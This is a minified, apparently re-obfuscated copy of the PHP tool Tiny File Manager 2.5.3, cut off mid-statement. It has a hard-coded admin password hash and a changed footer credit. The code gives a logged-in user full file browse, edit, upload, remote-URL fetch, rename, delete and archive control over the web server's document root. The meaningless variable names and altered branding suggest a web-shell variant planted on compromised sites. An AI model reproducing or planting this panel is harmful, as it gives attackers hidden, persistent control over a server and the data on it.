<?php
 $b='{"lang":"en","error_reporting":false,"show_hidden":false,"hide_Cols":false,"theme":"light"}';define('VERSION','2.5.3');define('APP_TITLE','Tiny File Manager');$c=true;$d=array('admin'=>'$2y$10$HNSzIP6lfXutPzV/YkLIoOKk4YssqqEchrsLHJXQMqV7pf5qMhEwK',);$g=array('user');$h=false;$j=array();$m=true;$n='vs';$o=true;$q='Etc/UTC';$r=$_SERVER['DOCUMENT_ROOT'];$s='';$t=$_SERVER['HTTP_HOST'];$u='UTF-8';$w='m/d/Y g:i A';$y='';$z='';$aa='';$bb=array();$cc='google';$dd=true;$ee=5000000000;$ff=2000000;$gg='OFF';$hh=true;$jj=array('127.0.0.1','::1');$kk=array('0.0.0.0','::');$ll=array('css-bootstrap'=>'<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">','css-dropzone'=>'<link href="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.css" rel="stylesheet">','css-font-awesome'=>'<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" crossorigin="anonymous">','css-highlightjs'=>'<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/styles/'.$n.'.min.css">','js-ace'=>'<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.13.1/ace.js"></script>','js-bootstrap'=>'<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>','js-dropzone'=>'<script src="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.js"></script>','js-jquery'=>'<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>','js-jquery-datatables'=>'<script src="https://cdn.datatables.net/1.13.1/js/jquery.dataTables.min.js" crossorigin="anonymous" defer></script>','js-highlightjs'=>'<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/highlight.min.js"></script>','pre-jsdelivr'=>'<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/>','pre-cloudflare'=>'<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin/><link rel="dns-prefetch" href="https://cdnjs.cloudflare.com"/>');$mm=__DIR__.'/config.php';if(is_readable($mm)){@include($mm);}define('MAX_UPLOAD_SIZE',$ee);define('UPLOAD_CHUNK_SIZE',$ff);if(!defined('FM_SESSION_ID')){define('FM_SESSION_ID','filemanager');}$nn=new FM_Config();$oo=isset($nn->data['lang'])?$nn->data['lang']:'en';$pp=isset($nn->data['show_hidden'])?$nn->data['show_hidden']:true;$qq=isset($nn->data['error_reporting'])?$nn->data['error_reporting']:true;$rr=isset($nn->data['hide_Cols'])?$nn->data['hide_Cols']:true;$ss=isset($nn->data['theme'])?$nn->data['theme']:'light';define('FM_THEME',$ss);$tt=array('en'=>'English');if($qq==true){@ini_set('error_reporting',E_ALL);@ini_set('display_errors',1);}else{@ini_set('error_reporting',E_ALL);@ini_set('display_errors',0);}if(defined('FM_EMBED')){$c=false;$dd=false;}else{@set_time_limit(600);date_default_timezone_set($q);ini_set('default_charset','UTF-8');if(version_compare(PHP_VERSION,'5.6.0','<')&&function_exists('mb_internal_encoding')){mb_internal_encoding('UTF-8');}if(function_exists('mb_regex_encoding')){mb_regex_encoding('UTF-8');}session_cache_limiter('');session_name(FM_SESSION_ID);function session_error_handling_function($uu,$vv,$ww,$xx){if($uu==2){session_abort();session_id(session_create_id());@session_start();}}set_error_handler('session_error_handling_function');session_start();restore_error_handler();}if(empty($_SESSION['token'])){$_SESSION['token']=bin2hex(random_bytes(32));}if(empty($d)){$c=false;}$yy=isset($_SERVER['HTTPS'])&&($_SERVER['HTTPS']=='on'||$_SERVER['HTTPS']==1)||isset($_SERVER['HTTP_X_FORWARDED_PROTO'])&&$_SERVER['HTTP_X_FORWARDED_PROTO']=='https';if(isset($_SESSION[FM_SESSION_ID]['logged'])&&!empty($j[$_SESSION[FM_SESSION_ID]['logged']])){$zz=fm_clean_path(dirname($_SERVER['PHP_SELF']));$s=$s.$zz.DIRECTORY_SEPARATOR.$j[$_SESSION[FM_SESSION_ID]['logged']];}$s=fm_clean_path($s);defined('FM_ROOT_URL')||define('FM_ROOT_URL',($yy?'https':'http').'://'.$t.(!empty($s)?'/'.$s:''));defined('FM_SELF_URL')||define('FM_SELF_URL',($yy?'https':'http').'://'.$t.$_SERVER['PHP_SELF']);if(isset($_GET['logout'])){unset($_SESSION[FM_SESSION_ID]['logged']);unset($_SESSION['token']);fm_redirect(FM_SELF_URL);}if($gg!='OFF'){function getClientIP(){if(array_key_exists('HTTP_CF_CONNECTING_IP',$_SERVER)){return $_SERVER["HTTP_CF_CONNECTING_IP"];}else if(array_key_exists('HTTP_X_FORWARDED_FOR',$_SERVER)){return $_SERVER["HTTP_X_FORWARDED_FOR"];}else if(array_key_exists('REMOTE_ADDR',$_SERVER)){return $_SERVER['REMOTE_ADDR'];}else if(array_key_exists('HTTP_CLIENT_IP',$_SERVER)){return $_SERVER['HTTP_CLIENT_IP'];}return'';}$aaa=getClientIP();$bbb=false;$ccc=in_array($aaa,$jj);$ddd=in_array($aaa,$kk);if($gg=='AND'){if($ccc==true&&$ddd==false){$bbb=true;}}else if($gg=='OR'){if($ccc==true||$ddd==false){$bbb=true;}}if($bbb==false){trigger_error('User connection denied from: '.$aaa,E_USER_WARNING);if($hh==false){fm_set_msg(lng('Access denied. IP restriction applicable'),'error');fm_show_header_login();fm_show_message();}exit();}}if($c){if(isset($_SESSION[FM_SESSION_ID]['logged'],$d[$_SESSION[FM_SESSION_ID]['logged']])){}elseif(isset($_POST['fm_usr'],$_POST['fm_pwd'],$_POST['token'])){sleep(1);if(function_exists('password_verify')){if(isset($d[$_POST['fm_usr']])&&isset($_POST['fm_pwd'])&&password_verify($_POST['fm_pwd'],$d[$_POST['fm_usr']])&&verifyToken($_POST['token'])){$_SESSION[FM_SESSION_ID]['logged']=$_POST['fm_usr'];fm_set_msg(lng('You are logged in'));fm_redirect(FM_ROOT_URL);}else{unset($_SESSION[FM_SESSION_ID]['logged']);fm_set_msg(lng('Login failed. Invalid username or password'),'error');fm_redirect(FM_ROOT_URL);}}else{fm_set_msg(lng('password_hash not supported, Upgrade PHP version'),'error');;}}else{unset($_SESSION[FM_SESSION_ID]['logged']);fm_show_header_login();?>
        <section class="h-100">
            <div class="container h-100">
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat <?php echo fm_get_theme();?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="mb-3">
                                       <div class="brand">
                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="H3K Tiny File Manager">
                                                <g transform="translate(0.000000,140.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
                                                    <path d="M160 700 l0 -600 110 0 110 0 0 260 0 260 70 0 70 0 0 -260 0 -260 110 0 110 0 0 600 0 600 -110 0 -110 0 0 -260 0 -260 -70 0 -70 0 0 260 0 260 -110 0 -110 0 0 -600z"/>
                                                    <path fill="#003500" d="M1008 1227 l-108 -72 0 -117 0 -118 110 0 110 0 0 110 0 110 70 0 70 0 0 -180 0 -180 -125 0 c-69 0 -125 -3 -125 -6 0 -3 23 -39 52 -80 l52 -74 73 0 73 0 0 -185 0 -185 -70 0 -70 0 0 115 0 115 -110 0 -110 0 0 -190 0 -190 181 0 181 0 109 73 108 72 1 181 0 181 -69 48 -68 49 68 50 69 49 0 249 0 248 -182 -1 -183 0 -107 -72z"/>
                                                    <path d="M1640 700 l0 -600 110 0 110 0 0 208 0 208 35 34 35 34 35 -34 35 -34 0 -208 0 -208 110 0 110 0 0 212 0 213 -87 87 -88 88 88 88 87 87 0 213 0 212 -110 0 -110 0 0 -208 0 -208 -70 -69 -70 -69 0 277 0 277 -110 0 -110 0 0 -600z"/></g>
                                            </svg>
                                        </div>
                                        <div class="text-center">
                                            <h1 class="card-title"><?php echo APP_TITLE;?></h1>
                                        </div>
                                    </div>
                                    <hr />
                                    <div class="mb-3">
                                        <label for="fm_usr" class="pb-2"><?php echo lng('Username');?></label>
                                        <input type="text" class="form-control" id="fm_usr" name="fm_usr" required autofocus>
                                    </div>

                                    <div class="mb-3">
                                        <label for="fm_pwd" class="pb-2"><?php echo lng('Password');?></label>
                                        <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" required>
                                    </div>

                                    <div class="mb-3">
                                        <?php fm_show_message();?>
                                    </div>
                                    <input type="hidden" name="token" value="<?php echo htmlentities($_SESSION['token']);?>" />
                                    <div class="mb-3">
                                        <button type="submit" class="btn btn-success btn-block w-100 mt-4" role="button">
                                            <?php echo lng('Login');?>
                                        </button>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="https://tinyfilemanager.github.io/" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION;?>">CCP Programmers</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <?php
 fm_show_footer_login();exit;}}if($c&&isset($_SESSION[FM_SESSION_ID]['logged'])){$r=isset($j[$_SESSION[FM_SESSION_ID]['logged']])?$j[$_SESSION[FM_SESSION_ID]['logged']]:$r;}$r=rtrim($r,'\\/');$r=str_replace('\\','/',$r);if(!@is_dir($r)){echo "<h1>".lng('Root path')." \"{$r}\" ".lng('not found!')." </h1>";exit;}defined('FM_SHOW_HIDDEN')||define('FM_SHOW_HIDDEN',$pp);defined('FM_ROOT_PATH')||define('FM_ROOT_PATH',$r);defined('FM_LANG')||define('FM_LANG',$oo);defined('FM_FILE_EXTENSION')||define('FM_FILE_EXTENSION',$y);defined('FM_UPLOAD_EXTENSION')||define('FM_UPLOAD_EXTENSION',$z);defined('FM_EXCLUDE_ITEMS')||define('FM_EXCLUDE_ITEMS',(version_compare(PHP_VERSION,'7.0.0','<')?serialize($bb):$bb));defined('FM_DOC_VIEWER')||define('FM_DOC_VIEWER',$cc);define('FM_READONLY',$h||($c&&!empty($g)&&isset($_SESSION[FM_SESSION_ID]['logged'])&&in_array($_SESSION[FM_SESSION_ID]['logged'],$g)));define('FM_IS_WIN',DIRECTORY_SEPARATOR=='\\');if(!isset($_GET['p'])&&empty($_FILES)){fm_redirect(FM_SELF_URL.'?p=');}$eee=isset($_GET['p'])?$_GET['p']:(isset($_POST['p'])?$_POST['p']:'');$eee=fm_clean_path($eee);$fff=file_get_contents('php://input');$_POST=(strpos($fff,'ajax')!=FALSE&&strpos($fff,'save')!=FALSE)?json_decode($fff,true):$_POST;define('FM_PATH',$eee);define('FM_USE_AUTH',$c);define('FM_EDIT_FILE',$o);defined('FM_ICONV_INPUT_ENC')||define('FM_ICONV_INPUT_ENC',$u);defined('FM_USE_HIGHLIGHTJS')||define('FM_USE_HIGHLIGHTJS',$m);defined('FM_HIGHLIGHTJS_STYLE')||define('FM_HIGHLIGHTJS_STYLE',$n);defined('FM_DATETIME_FORMAT')||define('FM_DATETIME_FORMAT',$w);unset($eee,$c,$u,$m,$n);if((isset($_SESSION[FM_SESSION_ID]['logged'],$d[$_SESSION[FM_SESSION_ID]['logged']])||!FM_USE_AUTH)&&isset($_POST['ajax'],$_POST['token'])&&!FM_READONLY){if(!verifyToken($_POST['token'])){header('HTTP/1.0 401 Unauthorized');die("Invalid Token.");}if(isset($_POST['type'])&&$_POST['type']=="search"){$ggg=$_POST['path']=="."?'':$_POST['path'];$hhh=scan(fm_clean_path($ggg),$_POST['content']);echo json_encode($hhh);exit();}if(isset($_POST['type'])&&$_POST['type']=="save"){$iii=FM_ROOT_PATH;if(FM_PATH!=''){$iii.='/'.FM_PATH;}if(!is_dir($iii)){fm_redirect(FM_SELF_URL.'?p=');}$ww=$_GET['edit'];$ww=fm_clean_path($ww);$ww=str_replace('/','',$ww);if($ww==''||!is_file($iii.'/'.$ww)){fm_set_msg(lng('File not found'),'error');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}header('X-XSS-Protection:0');$kkk=$iii.'/'.$ww;$lll=$_POST['content'];$mmm=fopen($kkk,"w");$nnn=@fwrite($mmm,$lll);fclose($mmm);if($nnn===false){header("HTTP/1.1 500 Internal Server Error");die("Could Not Write File! - Check Permissions / Ownership");}die(true);}if(isset($_POST['type'])&&$_POST['type']=="backup"&&!empty($_POST['file'])){$ooo=fm_clean_path($_POST['file']);$ppp=FM_ROOT_PATH.'/';if(!empty($_POST['path'])){$qqq=fm_clean_path($_POST['path']);$ppp.="{$qqq}/";}$rrr=date("dMy-His");$sss="{$ooo}-{$rrr}.bak";$ttt=$ppp.$ooo;try{if(!file_exists($ttt)){throw new Exception("File {$ooo} not found");}if(copy($ttt,$ppp.$sss)){echo"Backup {$sss} created";}else{throw new Exception("Could not copy file {$ooo}");}}catch(Exception $uuu){echo $uuu->getMessage();}}if(isset($_POST['type'])&&$_POST['type']=="settings"){global $nn,$oo,$qq,$pp,$tt,$rr,$ss;$vvv=$_POST['js-language'];fm_get_translations([]);if(!array_key_exists($vvv,$tt)){$vvv='en';}$www=isset($_POST['js-error-report'])&&$_POST['js-error-report']=="true"?true:false;$xxx=isset($_POST['js-show-hidden'])&&$_POST['js-show-hidden']=="true"?true:false;$yyy=isset($_POST['js-hide-cols'])&&$_POST['js-hide-cols']=="true"?true:false;$zzz=$_POST['js-theme-3'];if($nn->data['lang']!=$vvv){$nn->data['lang']=$vvv;$oo=$vvv;}if($nn->data['error_reporting']!=$www){$nn->data['error_reporting']=$www;$qq=$www;}if($nn->data['show_hidden']!=$xxx){$nn->data['show_hidden']=$xxx;$pp=$xxx;}if($nn->data['show_hidden']!=$xxx){$nn->data['show_hidden']=$xxx;$pp=$xxx;}if($nn->data['hide_Cols']!=$yyy){$nn->data['hide_Cols']=$yyy;$rr=$yyy;}if($nn->data['theme']!=$zzz){$nn->data['theme']=$zzz;$ss=$zzz;}$nn->save();echo true;}if(isset($_POST['type'])&&$_POST['type']=="pwdhash"){$aaaa=isset($_POST['inputPassword2'])&&!empty($_POST['inputPassword2'])?password_hash($_POST['inputPassword2'],PASSWORD_DEFAULT):'';echo $aaaa;}if(isset($_POST['type'])&&$_POST['type']=="upload"&&!empty($_REQUEST["uploadurl"])){$iii=FM_ROOT_PATH;if(FM_PATH!=''){$iii.='/'.FM_PATH;}function event_callback($bbbb){global $cccc;echo json_encode($bbbb);}function get_file_path(){global $iii,$dddd,$eeee;return $iii."/".basename($dddd->name);}$ffff=!empty($_REQUEST["uploadurl"])&&preg_match("|^http(s)?://.+$|",stripslashes($_REQUEST["uploadurl"]))?stripslashes($_REQUEST["uploadurl"]):null;$gggg=parse_url($ffff,PHP_URL_HOST);$hhhh=parse_url($ffff,PHP_URL_PORT);$iiii=[22,23,25,3306];if(preg_match("/^localhost$|^127(?:\.[0-9]+){0,2}\.[0-9]+$|^(?:0*\:)*?:?0*1$/i",$gggg)||in_array($hhhh,$iiii)){$jjjj=array("message"=>"URL is not allowed");event_callback(array("fail"=>$jjjj));exit();}$kkkk=false;$eeee=tempnam(sys_get_temp_dir(),"upload-");$dddd=new stdClass();$dddd->name=trim(basename($ffff),".\x00..\x20");$llll=(FM_UPLOAD_EXTENSION)?explode(',',FM_UPLOAD_EXTENSION):false;$mmmm=strtolower(pathinfo($dddd->name,PATHINFO_EXTENSION));$nnnn=($llll)?in_array($mmmm,$llll):true;$jjjj=false;if(!$nnnn){$jjjj=array("message"=>"File extension is not allowed");event_callback(array("fail"=>$jjjj));exit();}if(!$ffff){$oooo=false;}else if($kkkk){@$pppp=fopen($eeee,"w");@$qqqq=curl_init($ffff);curl_setopt($qqqq,CURLOPT_NOPROGRESS,false);curl_setopt($qqqq,CURLOPT_FOLLOWLOCATION,true);curl_setopt($qqqq,CURLOPT_FILE,$pppp);@$oooo=curl_exec($qqqq);$rrrr=curl_getinfo($qqqq);if(!$oooo){$jjjj=array("message"=>curl_error($qqqq));}@curl_close($qqqq);fclose($pppp);$dddd->size=$rrrr["size_download"];$dddd->type=$rrrr["content_type"];}else{$ssss=stream_context_create();@$oooo=copy($ffff,$eeee,$ssss);if(!$oooo){$jjjj=error_get_last();}}if($oooo){$oooo=rename($eeee,strtok(get_file_path(),'?'));}if($oooo){event_callback(array("done"=>$dddd));}else{unlink($eeee);if(!$jjjj){$jjjj=array("message"=>"Invalid url parameter");}event_callback(array("fail"=>$jjjj));}}exit();}if(isset($_GET['del'],$_POST['token'])&&!FM_READONLY){$tttt=str_replace('/','',fm_clean_path($_GET['del']));if($tttt!=''&&$tttt!='..'&&$tttt!='.'&&verifyToken($_POST['token'])){$iii=FM_ROOT_PATH;if(FM_PATH!=''){$iii.='/'.FM_PATH;}$uuuu=is_dir($iii.'/'.$tttt);if(fm_rdelete($iii.'/'.$tttt)){$vv=$uuuu?lng('Folder').' <b>%s</b> '.lng('Deleted'):lng('File').' <b>%s</b> '.lng('Deleted');fm_set_msg(sprintf($vv,fm_enc($tttt)));}else{$vv=$uuuu?lng('Folder').' <b>%s</b> '.lng('not deleted'):lng('File').' <b>%s</b> '.lng('not deleted');fm_set_msg(sprintf($vv,fm_enc($tttt)),'error');}}else{fm_set_msg(lng('Invalid file or folder name'),'error');}$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}if(isset($_POST['newfilename'],$_POST['newfile'],$_POST['token'])&&!FM_READONLY){$vvvv=urldecode($_POST['newfile']);$wwww=str_replace('/','',fm_clean_path(strip_tags($_POST['newfilename'])));if(fm_isvalid_filename($wwww)&&$wwww!=''&&$wwww!='..'&&$wwww!='.'&&verifyToken($_POST['token'])){$iii=FM_ROOT_PATH;if(FM_PATH!=''){$iii.='/'.FM_PATH;}if($vvvv=="file"){if(!file_exists($iii.'/'.$wwww)){if(fm_is_valid_ext($wwww)){@fopen($iii.'/'.$wwww,'w')or die('Cannot open file:  '.$wwww);fm_set_msg(sprintf(lng('File').' <b>%s</b> '.lng('Created'),fm_enc($wwww)));}else{fm_set_msg(lng('File extension is not allowed'),'error');}}else{fm_set_msg(sprintf(lng('File').' <b>%s</b> '.lng('already exists'),fm_enc($wwww)),'alert');}}else{if(fm_mkdir($iii.'/'.$wwww,false)===true){fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('Created'),$wwww));}elseif(fm_mkdir($iii.'/'.$wwww,false)===$iii.'/'.$wwww){fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('already exists'),fm_enc($wwww)),'alert');}else{fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('not created'),fm_enc($wwww)),'error');}}}else{fm_set_msg(lng('Invalid characters in file or folder name'),'error');}$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}if(isset($_GET['copy'],$_GET['finish'])&&!FM_READONLY){$xxxx=urldecode($_GET['copy']);$xxxx=fm_clean_path($xxxx);if($xxxx==''){fm_set_msg(lng('Source path not defined'),'error');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}$yyyy=FM_ROOT_PATH.'/'.$xxxx;$zzzz=FM_ROOT_PATH;if(FM_PATH!=''){$zzzz.='/'.FM_PATH;}$zzzz.='/'.basename($yyyy);$aaaaa=isset($_GET['move']);$aaaaa=fm_clean_path(urldecode($aaaaa));if($yyyy!=$zzzz){$bbbbb=trim(FM_PATH.'/'.basename($yyyy),'/');if($aaaaa){$ccccc=fm_rename($yyyy,$zzzz);if($ccccc){fm_set_msg(sprintf(lng('Moved from').' <b>%s</b> '.lng('to').' <b>%s</b>',fm_enc($xxxx),fm_enc($bbbbb)));}elseif($ccccc===null){fm_set_msg(lng('File or folder with this path already exists'),'alert');}else{fm_set_msg(sprintf(lng('Error while moving from').' <b>%s</b> '.lng('to').' <b>%s</b>',fm_enc($xxxx),fm_enc($bbbbb)),'error');}}else{if(fm_rcopy($yyyy,$zzzz)){fm_set_msg(sprintf(lng('Copied from').' <b>%s</b> '.lng('to').' <b>%s</b>',fm_enc($xxxx),fm_enc($bbbbb)));}else{fm_set_msg(sprintf(lng('Error while copying from').' <b>%s</b> '.lng('to').' <b>%s</b>',fm_enc($xxxx),fm_enc($bbbbb)),'error');}}}else{if(!$aaaaa){$bbbbb=trim(FM_PATH.'/'.basename($yyyy),'/');$ddddd=pathinfo($yyyy);$eeeee='';if(!is_dir($yyyy)){$eeeee='.'.$ddddd['extension'];}$fffff=$ddddd['dirname'].'/'.$ddddd['filename'].'-'.date('YmdHis').$eeeee;$ggggg=0;$hhhhh=1000;while(file_exists($fffff)&$ggggg<$hhhhh){$ddddd=pathinfo($fffff);$fffff=$ddddd['dirname'].'/'.$ddddd['filename'].'-copy'.$eeeee;$ggggg++;}if(fm_rcopy($yyyy,$fffff,False)){fm_set_msg(sprintf('Copyied from <b>%s</b> to <b>%s</b>',fm_enc($xxxx),fm_enc($fffff)));}else{fm_set_msg(sprintf('Error while copying from <b>%s</b> to <b>%s</b>',fm_enc($xxxx),fm_enc($fffff)),'error');}}else{fm_set_msg(lng('Paths must be not equal'),'alert');}}$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}if(isset($_POST['file'],$_POST['copy_to'],$_POST['finish'],$_POST['token'])&&!FM_READONLY){if(!verifyToken($_POST['token'])){fm_set_msg(lng('Invalid Token.'),'error');}$iii=FM_ROOT_PATH;if(FM_PATH!=''){$iii.='/'.FM_PATH;}$iiiii=FM_ROOT_PATH;$jjjjj=fm_clean_path($_POST['copy_to']);if($jjjjj!=''){$iiiii.='/'.$jjjjj;}if($iii==$iiiii){fm_set_msg(lng('Paths must be not equal'),'alert');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}if(!is_dir($iiiii)){if(!fm_mkdir($iiiii,true)){fm_set_msg('Unable to create destination folder','error');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}}$aaaaa=isset($_POST['move']);$kkkkk=0;$lllll=$_POST['file'];if(is_array($lllll)&&count($lllll)){foreach($lllll as $mmmmm){if($mmmmm!=''){$mmmmm=fm_clean_path($mmmmm);$yyyy=$iii.'/'.$mmmmm;$zzzz=$iiiii.'/'.$mmmmm;if($aaaaa){$ccccc=fm_rename($yyyy,$zzzz);if($ccccc===false){$kkkkk++;}}else{if(!fm_rcopy($yyyy,$zzzz)){$kkkkk++;}}}}if($kkkkk==0){$vv=$aaaaa?'Selected files and folders moved':'Selected files and folders copied';fm_set_msg($vv);}else{$vv=$aaaaa?'Error while moving items':'Error while copying items';fm_set_msg($vv,'error');}}else{fm_set_msg(lng('Nothing selected'),'alert');}$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}if(isset($_POST['rename_from'],$_POST['rename_to'],$_POST['token'])&&!FM_READONLY){if(!verifyToken($_POST['token'])){fm_set_msg("Invalid Token.",'error');}$nnnnn=urldecode($_POST['rename_from']);$nnnnn=fm_clean_path($nnnnn);$nnnnn=str_replace('/','',$nnnnn);$wwww=urldecode($_POST['rename_to']);$wwww=fm_clean_path(strip_tags($wwww));$wwww=str_replace('/','',$wwww);$iii=FM_ROOT_PATH;if(FM_PATH!=''){$iii.='/'.FM_PATH;}if(fm_isvalid_filename($wwww)&&$nnnnn!=''&&$wwww!=''){if(fm_rename($iii.'/'.$nnnnn,$iii.'/'.$wwww)){fm_set_msg(sprintf(lng('Renamed from').' <b>%s</b> '.lng('to').' <b>%s</b>',fm_enc($nnnnn),fm_enc($wwww)));}else{fm_set_msg(sprintf(lng('Error while renaming from').' <b>%s</b> '.lng('to').' <b>%s</b>',fm_enc($nnnnn),fm_enc($wwww)),'error');}}else{fm_set_msg(lng('Invalid characters in file name'),'error');}$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}if(isset($_GET['dl'],$_POST['token'])){if(!verifyToken($_POST['token'])){fm_set_msg("Invalid Token.",'error');}$ooooo=urldecode($_GET['dl']);$ooooo=fm_clean_path($ooooo);$ooooo=str_replace('/','',$ooooo);$iii=FM_ROOT_PATH;if(FM_PATH!=''){$iii.='/'.FM_PATH;}if($ooooo!=''&&is_file($iii.'/'.$ooooo)){fm_download_file($iii.'/'.$ooooo,$ooooo,1024);exit;}else{fm_set_msg(lng('File not found'),'error');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}}if(!empty($_FILES)&&!FM_READONLY){if(isset($_POST['token'])){if(!verifyToken($_POST['token'])){$hhh=array('status'=>'error','info'=>"Invalid Token.");echo json_encode($hhh);exit();}}else{$hhh=array('status'=>'error','info'=>"Token Missing.");echo json_encode($hhh);exit();}$ppppp=false;$qqqqq=$_POST['dzchunkindex'];$rrrrr=$_POST['dztotalchunkcount'];$sssss=fm_clean_path($_REQUEST['fullpath']);$mmmmm=$_FILES;$iii=FM_ROOT_PATH;$ttttt=DIRECTORY_SEPARATOR;if(FM_PATH!=''){$iii.='/'.FM_PATH;}$kkkkk=0;$uuuuu=0;$llll=(FM_UPLOAD_EXTENSION)?explode(',',FM_UPLOAD_EXTENSION):false;$hhh=array('status'=>'error','info'=>'Oops! Try again');$vvvvv=$mmmmm['file']['name'];$wwwww=$mmmmm['file']['tmp_name'];$mmmm=pathinfo($vvvvv,PATHINFO_FILENAME)!=''?strtolower(pathinfo($vvvvv,PATHINFO_EXTENSION)):'';$nnnn=($llll)?in_array($mmmm,$llll):true;if(!fm_isvalid_filename($vvvvv)&&!fm_isvalid_filename($sssss)){$hhh=array('status'=>'error','info'=>"Invalid File name!",);echo json_encode($hhh);exit();}$xxxxx=$iii.$ttttt;if(is_writable($xxxxx)){$ppp=$iii.'/'.basename($sssss);$yyyyy=substr($ppp,0,strrpos($ppp,"/"));if(file_exists($ppp)&&!$ppppp&&!$zzzzz){$aaaaaa=$mmmm?'.'.$mmmm:'';$ppp=$iii.'/'.basename($sssss,$aaaaaa).'_'.date('ymdHis').$aaaaaa;}if(!is_dir($yyyyy)){$nnnnn=umask(0);mkdir($yyyyy,0777,true);umask($nnnnn);}if(empty($mmmmm['file']['error'])&&!empty($wwwww)&&$wwwww!='none'&&$nnnn){if($rrrrr){$bbbbbb=@fopen("{$ppp}.part",$qqqqq==0?"wb":"ab");if($bbbbbb){$cccccc=@fopen($wwwww,"rb");if($cccccc){while($dddddd=fread($cccccc,4096)){fwrite($bbbbbb,$dddddd);}$hhh=array('status'=>'success','info'=>"file upload successful");}else{$hhh=array('status'=>'error','info'=>"failed to open output stream",'errorDetails'=>error_get_last());}@fclose($cccccc);@fclose($bbbbbb);@unlink($wwwww);$hhh=array('status'=>'success','info'=>"file upload successful");}else{$hhh=array('status'=>'error','info'=>"failed to open output stream");}if($qqqqq==$rrrrr-1){rename("{$ppp}.part",$ppp);}}else if(move_uploaded_file($wwwww,$ppp)){if(file_exists($ppp)){$hhh=array('status'=>'success','info'=>"file upload successful");}else{$hhh=array('status'=>'error','info'=>'Couldn\'t upload the requested file.');}}else{$hhh=array('status'=>'error','info'=>"Error while uploading files. Uploaded files $uuuuu",);}}}else{$hhh=array('status'=>'error','info'=>'The specified folder for upload isn\'t writeable.');}echo json_encode($hhh);exit();}if(isset($_POST['group'],$_POST['delete'],$_POST['token'])&&!FM_READONLY){if(!verifyToken($_POST['token'])){fm_set_msg(lng("Invalid Token."),'error');}$iii=FM_ROOT_PATH;if(FM_PATH!=''){$iii.='/'.FM_PATH;}$kkkkk=0;$lllll=$_POST['file'];if(is_array($lllll)&&count($lllll)){foreach($lllll as $mmmmm){if($mmmmm!=''){$eeeeee=$iii.'/'.$mmmmm;if(!fm_rdelete($eeeeee)){$kkkkk++;}}}if($kkkkk==0){fm_set_msg(lng('Selected files and folder deleted'));}else{fm_set_msg(lng('Error while deleting items'),'error');}}else{fm_set_msg(lng('Nothing selected'),'alert');}$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}if(isset($_POST['group'],$_POST['token'])&&(isset($_POST['zip'])||isset($_POST['tar']))&&!FM_READONLY){if(!verifyToken($_POST['token'])){fm_set_msg(lng("Invalid Token."),'error');}$iii=FM_ROOT_PATH;$mmmm='zip';if(FM_PATH!=''){$iii.='/'.FM_PATH;}$mmmm=isset($_POST['tar'])?'tar':'zip';if(($mmmm=="zip"&&!class_exists('ZipArchive'))||($mmmm=="tar"&&!class_exists('PharData'))){fm_set_msg(lng('Operations with archives are not available'),'error');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));}$lllll=$_POST['file'];$ffffff=array();foreach($lllll as $ww){array_push($ffffff,fm_clean_path($ww));}$lllll=$ffffff;if(!empty($lllll)){chdir($iii);if(count($lllll)==1){$gggggg=reset($lllll);$gggggg=basename($gggggg);$hhhhhh=$gggggg.'_'.date('ymd_His').'.'.$mmmm;}else{$hhhhhh='archive_'.date('ymd_His').'.'.$mmmm;}if($mmmm=='zip'){$iiiiii=new FM_Zipper();$aaaa=$iiiiii->create($hhhhhh,$lllll);}elseif($mmmm=='tar'){$jjjjjj=new 